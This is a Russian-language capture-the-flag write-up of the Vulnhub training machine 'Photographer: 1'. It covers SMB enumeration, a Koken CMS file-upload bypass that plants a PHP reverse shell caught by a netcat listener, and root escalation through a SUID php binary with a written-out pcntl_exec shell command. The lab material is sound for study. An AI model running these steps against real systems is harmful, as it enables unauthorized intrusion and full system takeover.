# Photographer: 1
## Vulnhub machine

- Название: Photographer: 1
- OS: Linux
- Ресурс: Vulnhub
- Сложность: Beginning
- Дата релиза: 21.07.20
- Оригинальное описание: 
>This machine was developed to prepare for OSCP. It is boot2root, tested on VirtualBox (but works on VMWare) and has two flags: user.txt and proof.txt.


## Write-up

```html
┌─[root@parrot-virtual]─[/home/user]
└──╼ #nmap -sV 192.168.0.111
Starting Nmap 7.80 ( https://nmap.org ) at 2020-08-21 13:29 BST
Nmap scan report for 192.168.0.111
Host is up (0.00050s latency).
Not shown: 996 closed ports
PORT     STATE SERVICE     VERSION
80/tcp   open  http        Apache httpd 2.4.18 ((Ubuntu))
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
8000/tcp open  http        Apache httpd 2.4.18 ((Ubuntu))
MAC Address: 08:00:27:D1:68:39 (Oracle VirtualBox virtual NIC)
Service Info: Host: PHOTOGRAPHER

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 14.04 seconds
```

>Сканируем директории:

```html 
File found: /i.php - 403
File found: /a.php - 403
File found: /dl.php - 403
File found: /index.php - 200
Dir found: /admin/ - 200
Dir found: /admin/images/ - 403
Dir found: /icons/ - 403
Dir found: /admin/templates/ - 403
Dir found: /storage/ - 403
Dir found: /home/ - 200
Dir found: /category/ - 200
Dir found: /page/ - 500
Dir found: /categories/ - 200
Dir found: /tag/ - 200
Dir found: /storage/services/ - 403
Dir found: /date/ - 200
Dir found: /page/2006/ - 200
Dir found: /categories/index/ - 200
Dir found: /categories/images/ - 200
Dir found: /page/12/ - 200
Dir found: /page/11/ - 200
Dir found: /storage/themes/ - 200
Dir found: /page/10/ - 200
Dir found: /page/2005/ - 200
Dir found: /admin/css/ - 403
Dir found: /page/1/ - 200
Dir found: /page/09/ - 200
Dir found: /page/01/ - 200
Dir found: /page/08/ - 200
Dir found: /page/06/ - 200
Dir found: /page/2/ - 200
Dir found: /page/07/ - 200
Dir found: /app/ - 200
Dir found: /page/05/ - 200
Dir found: /page/04/ - 200
Dir found: /page/03/ - 200
Dir found: /page/02/ - 200
Dir found: /page/3/ - 200
Dir found: /page/13/ - 200
Dir found: /page/4/ - 200
Dir found: /page/14/ - 200
Dir found: /page/15/ - 200
Dir found: /page/16/ - 200
Dir found: /page/2004/ - 200
Dir found: /page/18/ - 200
Dir found: /page/20/ - 200
Dir found: /page/21/ - 200
Dir found: /page/5/ - 200
Dir found: /page/22/ - 200
Dir found: /page/6/ - 200
Dir found: /page/19/ - 200
Dir found: /page/24/ - 200
Dir found: /page/2007/ - 200
Dir found: /page/23/ - 200
Dir found: /page/17/ - 200
Dir found: /page/27/ - 200
Dir found: /page/26/ - 200
Dir found: /page/9/ - 200
Dir found: /page/30/ - 200
Dir found: /page/29/ - 200
Dir found: /page/28/ - 200
Dir found: /page/7/ - 200
Dir found: /page/25/ - 200
Dir found: /page/1/index/ - 200
Dir found: /page/0/ - 200
Dir found: /page/8/ - 200
Dir found: /page/1/home/ - 200
Dir found: /page/31/ - 200
```

>Воспользуемся утилитой enum4linux:

```html
┌─[✗]─[root@parrot-virtual]─[~]
└──╼ #enum4linux 192.168.0.111
Starting enum4linux v0.8.9 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Fri Aug 21 16:02:13 2020

 ========================== 
|    Target Information    |
 ========================== 
Target ........... 192.168.0.111
RID Range ........ 500-550,1000-1050
Username ......... ''
Password ......... ''
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none


 ===================================================== 
|    Enumerating Workgroup/Domain on 192.168.0.111    |
 ===================================================== 
[+] Got domain/workgroup name: WORKGROUP

 ============================================= 
|    Nbtstat Information for 192.168.0.111    |
 ============================================= 
Looking up status of 192.168.0.111
	PHOTOGRAPHER    00 -         B ACTIVE  Workstation Service
	PHOTOGRAPHER    03 -         B ACTIVE  Messenger Service
	PHOTOGRAPHER    20 -         B ACTIVE  File Server Service
	..__MSBROWSE__. 01 -  GROUP  B ACTIVE  Master Browser
	WORKGROUP       00 -  GROUP  B ACTIVE  Domain/Workgroup Name
	WORKGROUP       1d -         B ACTIVE  Master Browser
	WORKGROUP       1e -  GROUP  B ACTIVE  Browser Service Elections

	MAC Address = 00-00-00-00-00-00

 ====================================== 
|    Session Check on 192.168.0.111    |
 ====================================== 
[+] Server 192.168.0.111 allows sessions using username '', password ''

 ============================================ 
|    Getting domain SID for 192.168.0.111    |
 ============================================ 
Domain Name: WORKGROUP
Domain Sid: (NULL SID)
[+] Can't determine if host is part of domain or part of a workgroup

 ======================================= 
|    OS information on 192.168.0.111    |
 ======================================= 
Use of uninitialized value $os_info in concatenation (.) or string at ./enum4linux.pl line 464.
[+] Got OS info for 192.168.0.111 from smbclient: 
[+] Got OS info for 192.168.0.111 from srvinfo:
	PHOTOGRAPHER   Wk Sv PrQ Unx NT SNT photographer server (Samba, Ubuntu)
	platform_id     :	500
	os version      :	6.1
	server type     :	0x809a03

 ============================== 
|    Users on 192.168.0.111    |
 ============================== 
Use of uninitialized value $users in print at ./enum4linux.pl line 874.
Use of uninitialized value $users in pattern match (m//) at ./enum4linux.pl line 877.

Use of uninitialized value $users in print at ./enum4linux.pl line 888.
Use of uninitialized value $users in pattern match (m//) at ./enum4linux.pl line 890.

 ========================================== 
|    Share Enumeration on 192.168.0.111    |
 ========================================== 

	Sharename       Type      Comment
	---------       ----      -------
	print$          Disk      Printer Drivers
	sambashare      Disk      Samba on Ubuntu
	IPC$            IPC       IPC Service (photographer server (Samba, Ubuntu))
SMB1 disabled -- no workgroup available

[+] Attempting to map shares on 192.168.0.111
//192.168.0.111/print$	Mapping: DENIED, Listing: N/A
//192.168.0.111/sambashare	Mapping: OK, Listing: OK
//192.168.0.111/IPC$	[E] Can't understand response:
NT_STATUS_OBJECT_NAME_NOT_FOUND listing \*

 ===================================================== 
|    Password Policy Information for 192.168.0.111    |
 ===================================================== 


[+] Attaching to 192.168.0.111 using a NULL share

[+] Trying protocol 139/SMB...

[+] Found domain(s):

	[+] PHOTOGRAPHER
	[+] Builtin

[+] Password Info for Domain: PHOTOGRAPHER

	[+] Minimum password length: 5
	[+] Password history length: None
	[+] Maximum password age: 37 days 6 hours 21 minutes 
	[+] Password Complexity Flags: 000000

		[+] Domain Refuse Password Change: 0
		[+] Domain Password Store Cleartext: 0
		[+] Domain Password Lockout Admins: 0
		[+] Domain Password No Clear Change: 0
		[+] Domain Password No Anon Change: 0
		[+] Domain Password Complex: 0

	[+] Minimum password age: None
	[+] Reset Account Lockout Counter: 30 minutes 
	[+] Locked Account Duration: 30 minutes 
	[+] Account Lockout Threshold: None
	[+] Forced Log off Time: 37 days 6 hours 21 minutes 


[+] Retieved partial password policy with rpcclient:

Password Complexity: Disabled
Minimum Password Length: 5


 =============================== 
|    Groups on 192.168.0.111    |
 =============================== 

[+] Getting builtin groups:

[+] Getting builtin group memberships:

[+] Getting local groups:

[+] Getting local group memberships:

[+] Getting domain groups:

[+] Getting domain group memberships:

 ======================================================================== 
|    Users on 192.168.0.111 via RID cycling (RIDS: 500-550,1000-1050)    |
 ======================================================================== 
[I] Found new SID: S-1-22-1
[I] Found new SID: S-1-5-21-3693138109-3993630114-3057792995
[I] Found new SID: S-1-5-32
[+] Enumerating users using SID S-1-5-32 and logon username '', password ''
S-1-5-32-544 BUILTIN\Administrators (Local Group)
S-1-5-32-545 BUILTIN\Users (Local Group)
S-1-5-32-546 BUILTIN\Guests (Local Group)
S-1-5-32-547 BUILTIN\Power Users (Local Group)
S-1-5-32-548 BUILTIN\Account Operators (Local Group)
S-1-5-32-549 BUILTIN\Server Operators (Local Group)
S-1-5-32-550 BUILTIN\Print Operators (Local Group)

[+] Enumerating users using SID S-1-22-1 and logon username '', password ''
S-1-22-1-1000 Unix User\daisa (Local User)
S-1-22-1-1001 Unix User\agi (Local User)
[+] Enumerating users using SID S-1-5-21-3693138109-3993630114-3057792995 and logon username '', password ''
S-1-5-21-3693138109-3993630114-3057792995-500 *unknown*\*unknown* (8)
S-1-5-21-3693138109-3993630114-3057792995-501 PHOTOGRAPHER\nobody (Local User)
S-1-5-21-3693138109-3993630114-3057792995-502 *unknown*\*unknown* (8)
S-1-5-21-3693138109-3993630114-3057792995-503 *unknown*\*unknown* (8)
S-1-5-21-3693138109-3993630114-3057792995-504 *unknown*\*unknown* (8)
S-1-5-21-3693138109-3993630114-3057792995-505 *unknown*\*unknown* (8)
S-1-5-21-3693138109-3993630114-3057792995-506 *unknown*\*unknown* (8)
S-1-5-21-3693138109-3993630114-3057792995-507 *unknown*\*unknown* (8)
S-1-5-21-3693138109-3993630114-3057792995-508 *unknown*\*unknown* (8)
S-1-5-21-3693138109-3993630114-3057792995-509 *unknown*\*unknown* (8)
S-1-5-21-3693138109-3993630114-3057792995-510 *unknown*\*unknown* (8)
S-1-5-21-3693138109-3993630114-3057792995-511 *unknown*\*unknown* (8)
S-1-5-21-3693138109-3993630114-3057792995-512 *unknown*\*unknown* (8)
S-1-5-21-3693138109-3993630114-3057792995-513 PHOTOGRAPHER\None (Domain Group)
S-1-5-21-3693138109-3993630114-3057792995-514
 ============================================== 
|    Getting printer info for 192.168.0.111    |
 ============================================== 
No printers returned.


enum4linux complete on Fri Aug 21 16:02:40 2020
```

>Пробуем получить доступ к общей директории:

```html
┌─[root@parrot-virtual]─[~]
└──╼ #smbclient -U '' //192.168.0.111/sambashare
Enter WORKGROUP\'s password: 
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Tue Jul 21 02:30:07 2020
  ..                                  D        0  Tue Jul 21 10:44:25 2020
  mailsent.txt                        N      503  Tue Jul 21 02:29:40 2020
  wordpress.bkp.zip                   N 13930308  Tue Jul 21 02:22:23 2020

		278627392 blocks of size 1024. 264268400 blocks available
```

>Прочтем файл mailsent.txt:

```html
┌─[root@parrot-virtual]─[~]
└──╼ #cat mailsent.txt 
Message-ID: 4129F3CA.2020509@dc.edu
Date: Mon, 20 Jul 2020 11:40:36 -0400
From: Agi Clarence agi@photographer.com
User-Agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.0.1) Gecko/20020823 Netscape/7.0
X-Accept-Language: en-us, en
MIME-Version: 1.0
To: Daisa Ahomi daisa@photographer.com
Subject: To Do - Daisa Website's
Content-Type: text/plain; charset=us-ascii; format=flowed
Content-Transfer-Encoding: 7bit

Hi Daisa!
Your site is ready now.
Don't forget your secret, my babygirl ;)
```

>Получен адрес электронной почты и возможный намек на пароль, заходим на /admin и логинимся. Видим Koken CMS и сразу проверяем есть ли что-то о ней на exploit-db:

```html
https://www.exploit-db.com/exploits/48706
```

>Есть возможность загрузки произвольного файла, процесс подробно описан по ссылке. Создаем файл php, вписываем туда реверс шелл с указанием своего ip и порта, меняем расширение файла на 'shell.php.jpg', в CMS нажимаем import content, перехватываем запрос с помощью burp, в запросе снова меняем расширение 'shell.php.jpg' на 'shell.php'. Также включаем слушатель на порт, указанный в шелле:

```html
┌─[root@parrot-virtual]─[~]
└──╼ #nc -lvnp 4444
listening on [any] 4444 ...
```

>Когда файл успешно загружен, необходимо к нему обратиться, в CMS перейдем в раздел 'content', находим шелл и жмем на него, в браузерной строке должен появиться полный путь к файлу php, если все прошло успешно, так будет выглядеть слушатель netcat:


```html 
┌─[root@parrot-virtual]─[~]
└──╼ #nc -lvnp 4444
listening on [any] 4444 ...
connect to [192.168.0.107] from (UNKNOWN) [192.168.0.111] 47004
Linux photographer 4.15.0-45-generic #48~16.04.1-Ubuntu SMP Tue Jan 29 18:03:48 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
 12:38:56 up  4:17,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

>Тут лежит первый флаг:

```html
$ pwd
pwd
/home/daisa
$ cat user.txt
cat user.txt
d41d8cd98f00b204e9800998ecf8427e
```

>Спавним оболочку:

```html
$ python -c 'import pty; pty.spawn("/bin/bash")'
python -c 'import pty; pty.spawn("/bin/bash")'
www-data@photographer:/home/daisa$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

>Переходим к эскалации прав:

```html
ww-data@photographer:/var/www$ find / -perm -u=s -type f 2>/dev/null
find / -perm -u=s -type f 2>/dev/null
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/eject/dmcrypt-get-device
/usr/lib/xorg/Xorg.wrap
/usr/lib/snapd/snap-confine
/usr/lib/openssh/ssh-keysign
/usr/lib/x86_64-linux-gnu/oxide-qt/chrome-sandbox
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/sbin/pppd
/usr/bin/pkexec
/usr/bin/passwd
/usr/bin/newgrp
/usr/bin/gpasswd
/usr/bin/php7.2
/usr/bin/sudo
/usr/bin/chsh
/usr/bin/chfn
/bin/ntfs-3g
/bin/ping
/bin/fusermount
/bin/mount
/bin/ping6
/bin/umount
/bin/su
```

>Из всего самое интересное это возможность запускать исполняемые файлы php от root пользователя. Поищем подсказки -- https://gtfobins.github.io/gtfobins/php/#suid

```html
https://gtfobins.github.io/gtfobins/php/#suid

It runs with the SUID bit set and may be exploited to access the file system, escalate or maintain access with elevated privileges working as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.

This example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To exploit an existing SUID binary skip the first command and run the program using its original path.

sudo sh -c 'cp $(which php) .; chmod +s ./php'

CMD="/bin/sh"
./php -r "pcntl_exec('/bin/sh', ['-p']);"
```

>Команда будет выглядеть следующим образом:

```html
/usr/bin/php7.2 -r "pcntl_exec('/bin/bash', ['-p']);"
```

>Команда запускает новую оболочку, обязателен флаг -p, иначе не будет смены пользователя на root:

```html
www-data@photographer:/$ /usr/bin/php7.2 -r "pcntl_exec('/bin/bash', ['-p']);"
sr/bin/php7.2 -r "pcntl_exec('/bin/bash', ['-p']);"                         
bash-4.3# id
id
uid=33(www-data) gid=33(www-data) euid=0(root) groups=33(www-data)
bash-4.3# whoami
whoami
root
```

>И берем последний флаг:

```html
bash-4.3# cat proof.txt
cat proof.txt
                                                                   
                                .:/://::::///:-`                                
                            -/++:+`:--:o:  oo.-/+/:`                            
                         -++-.`o++s-y:/s: `sh:hy`:-/+:`                         
                       :o:``oyo/o`. `      ```/-so:+--+/`                       
                     -o:-`yh//.                 `./ys/-.o/                      
                    ++.-ys/:/y-                  /s-:/+/:/o`                    
                   o/ :yo-:hNN                   .MNs./+o--s`                   
                  ++ soh-/mMMN--.`            `.-/MMMd-o:+ -s                   
                 .y  /++:NMMMy-.``            ``-:hMMMmoss: +/                  
                 s-     hMMMN` shyo+:.    -/+syd+ :MMMMo     h                  
                 h     `MMMMMy./MMMMMd:  +mMMMMN--dMMMMd     s.                 
                 y     `MMMMMMd`/hdh+..+/.-ohdy--mMMMMMm     +-                 
                 h      dMMMMd:````  `mmNh   ```./NMMMMs     o.                 
                 y.     /MMMMNmmmmd/ `s-:o  sdmmmmMMMMN.     h`                 
                 :o      sMMMMMMMMs.        -hMMMMMMMM/     :o                  
                  s:     `sMMMMMMMo - . `. . hMMMMMMN+     `y`                  
                  `s-      +mMMMMMNhd+h/+h+dhMMMMMMd:     `s-                   
                   `s:    --.sNMMMMMMMMMMMMMMMMMMmo/.    -s.                    
                     /o.`ohd:`.odNMMMMMMMMMMMMNh+.:os/ `/o`                     
                      .++-`+y+/:`/ssdmmNNmNds+-/o-hh:-/o-                       
                        ./+:`:yh:dso/.+-++++ss+h++.:++-                         
                           -/+/-:-/y+/d:yh-o:+--/+/:`                           
                              `-///////////////:`                               
                                                                                

Follow me at: http://v1n1v131r4.com


d41d8cd98f00b204e9800998ecf8427e
```
